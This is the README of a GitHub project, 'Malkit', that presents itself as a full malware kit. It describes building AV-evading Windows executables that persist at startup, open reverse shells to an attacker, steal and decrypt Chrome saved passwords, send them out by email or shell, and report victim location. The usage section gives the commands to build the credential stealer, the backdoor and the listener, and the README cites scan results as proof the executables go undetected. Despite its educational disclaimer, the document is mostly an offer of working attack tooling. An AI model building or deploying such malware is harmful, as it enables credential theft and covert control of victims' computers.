<h1 align='center'>Malkit - Full malware kit</h1>
<p align="center">	
    <img src="https://img.shields.io/badge/Platform-Windows-green?style=plastic" />
	<a href="https://github.com/darkarp/malkit/releases/latest?style=plastic">
	<img src="https://img.shields.io/github/v/release/darkarp/malkit?style=plastic" alt="Release" />
	</a>
    <img src="https://img.shields.io/badge/build-passing-green?style=plastic" alt="Build Status on CircleCI" />
    <img src="https://img.shields.io/maintenance/yes/2021" />
	</br>
  
  <a href="https://github.com/darkarp/malkit/commits/master">
    <img src="https://img.shields.io/github/last-commit/darkarp/malkit?style=plastic" />
  </a>
  <img alt="Scrutinizer code quality (GitHub/Bitbucket)" src="https://img.shields.io/scrutinizer/quality/g/darkarp/malkit?style=flat">


  <a href="https://github.com/darkarp/malkit/blob/master/LICENSE">
    <img src="https://img.shields.io/github/license/darkarp/malkit?style=plastic" />
  </a>


  </br>

  <a href="https://github.com/darkarp/malkit/issues?q=is%3Aopen+is%3Aissue">
	<img alt="GitHub issues" src="https://img.shields.io/github/issues/darkarp/malkit?style=plastic">
</a>

<a href="https://github.com/darkarp/malkit/issues?q=is%3Aissue+is%3Aclosed">
	<img alt="GitHub closed issues" src="https://img.shields.io/github/issues-closed/darkarp/malkit">
</a>
</br>
  <a href="https://discord.gg/beczNYP">
    <img src="https://img.shields.io/badge/discord-join-7289DA.svg?logo=discord&longCache=true&style=flat" />
  </a>
  </br>
    <a href="https://github.com/darkarp/chromepass/issues/new?assignees=&labels=&template=bug_report.md&title=">Report Bug</a>
    ·
    <a href="https://github.com/darkarp/chromepass/issues/new?assignees=&labels=&template=feature_request.md&title=">Request Feature</a>
  </p>  
  
  
<!-- TABLE OF CONTENTS -->
## Table of Contents

* [About the Project](#about-the-project)  
	* [AV Detection](#av-detection)
* [Getting started](#getting-started)
  * [Prerequisites](#dependencies-and-requirements)
  * [Installation](#installation)
* [Usage](#usage)
* [Todo](#todo)
* [Errors, Bugs and Feature Requests](#errors-bugs-and-feature-requests)
* [Learn More](#learn-more)
* [License](#license)

## About The project
Malkit is a python-based console application that generates runtime-decrypted undetectable windows executables.
It has the following features:
  - Copying itself into startup as a legitimate application
  - Connecting back to an attacker via reverse shell
  - Custom listener with upload, download and modular capability (in progress)
  - Chromepass feature:
    - Decrypt Chrome saved paswords
    - Send a file with the login/password combinations remotely (email or reverse shell)
    - Custom icon
    - Custom error message
  - Accurate location reporting. It can detect and send back a victim's accurate geolocation (not ip-based) (X)
  - Easy to use
  - Completely undetectable by AV engines

Features marked with an X are still in development and aren't fully working but are already complete in internal testing.
### AV Detection!
Due to the way this has been coded, it is currently fully undetected. Here are some links to scans performed
  - [From build_malware](https://www.virustotal.com/gui/file/61fc9c4ad472a240f4fd010958a0b0210f6513ed878bd47b90e25da871e52068/detection) 
  - [From build_chromepass](https://antiscan.me/scan/new/result?id=kmpsMNccfuRJ)
  - Both scans yielded the result: 1/69 detections. The sole detection is a false positive by Sangfor Engine Zero. I tried submitting a simple hello world program for analysis and the same AV detected it as malware as well.
  - This is an educational project first and foremost, so distribution (or the lack thereof) is not a concern, hence the usage of VirusTotal

## Getting started

### Dependencies and Requirements

This is a very simple application, which uses only:

* [Python] - Only tested on 3.7.5 on Anaconda environment but should work in 3.6+ (Doesn't work in 3.8 yet)

### Installation

Chromepass requires [Python] 3.6+ to run.
It has been tested on a full anaconda installation but it doesn't necessariliy require it.  
The instructions on the full setup are below.

**Setup Anaconda environment:**
  - Visit [Anaconda](https://www.anaconda.com/distribution/#download-section) and download the graphical installer for windows.
  - Run the installer and make sure you select the checkbox "Add conda to path", even though it isn't recommended.
  - Update anaconda by opening powershell and typing:
     - `conda init powershell`
     - `conda update conda`
  - Create a new anaconda environment:
    - `conda create -n malkit python=3.7`
  - Activate your environment:
    - `conda activate malkit`
    - Note: Every time you open a new powershell and want to run malkit you need to activate your environment.  


**Clone the Repository and access its directory:**
```powershell
> git clone https://github.com/darkarp/malkit.git
> cd malkit
```  

**Install the dependencies:**

```powershell
> pip install -r requirements.txt
```

If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+ < 3.8 (preferably 3.7.5).
If the errors persist, try:
```powershell
> python -m pip install --upgrade pip
> python -m pip install -r requirements.txt
```  
  


## Usage

* Show the help screen

```powershell
> python malkit.py -h
```  

```
usage: python malkit.py [-h] {build_listener, build_malware, build_chromepass} ...

positional arguments:
  {build_listener, build_malware, build_chromepass}

optional arguments:
  -h, --help            show this help message and exit

```  
* Access the help menu for individual arguments

```powershell
>python malkit.py build_chromepass -h
```  

```
usage: python malkit.py build_chromepass [-h] [--load] [--email] [--reverse_shell]
                                  [--no_error]
                                  [--errormsg Error message to appear]
                                  [--address Email address to send details to, if Email was chosen]
                                  [--port Port for reverse connection, if Reverse shell was chosen.]
                                  [--host Host reverse connection, if Reverse shell was chosen.]

optional arguments:
  -h, --help            show this help message and exit
  --load
  --email
  --reverse_shell
  --no_error
  --errormsg Error message to appear
  --address Email address to send details to, if Email was chosen
  --port Port for reverse connection, if Reverse shell was chosen.
  --host Host reverse connection, if Reverse shell was chosen.

example:

 python malkit.py build_chromepass --email --address myemail@gmail.com
 python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
 python malkit.py build_chromepass --load myfile.conf
 ```  
 

 * Grabbing and sending chrome-saved passwords through email
 `python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com`  

 * Creating a persistent reverse_shell with additional features
 `python malkit.py build_malware --host 127.0.0.1 -p 444`
  - Replace the host with your external/internal ip as needed
  - Replace the port as needed
  - Make sure you build the listener as well and run it.  
 
 * Creating a listener for the malware
 `python malkit.py build_listener -p 444`
  - This is the listener for the malware
  - While in the shell, you can use the `list` command to see active sessions.
  - You can interact with a session by using the command: `interact::SESSION_NUMBER` where SESSION_NUMBER is the number of the session yo want to connect with. 
  - To go back into listener mode after interacting with a session, use the command `<bg` or `<background`
  - Other commands while interacting have been added but still experimental:
    - `<download` - Downloads a file from the server


## Todo
 - Sending Real-time precise location of the victim (***completed, releases next update***)
 - Also steal Firefox passwords (***Completed, releases next update***)
 - Option of installing a backdoor allowing remote control of the victim's computer (***completed, releases next update***)
 - Also steal passwords from other programs, such as keychains(***in progress***)
 - Better encryption (***Completed, releases into beta version***)
   
## Errors, Bugs and feature requests

If you find an error or a bug, please report it as an issue.
If you wish to suggest a feature or an improvement please report it in the issue pages.

Please follow the templates shown when creating the issue.

## Learn More

For access to a community full of aspiring computer security experts, ranging from the complete beginner to the seasoned veteran,
join our Discord Server: [WhiteHat Hacking](https://discord.gg/beczNYP)

If you wish to contact me, you can do so via: marionascimento@itsec.bz

## Disclaimer
I am not responsible for what you do with the information and code provided. This is intended for professional or educational purposes only.

## License
<a href="https://github.com/darkarp/malkit/blob/master/LICENSE"> MIT </a>
   
[Python]: <https://www.anaconda.com/distribution/#download-section>


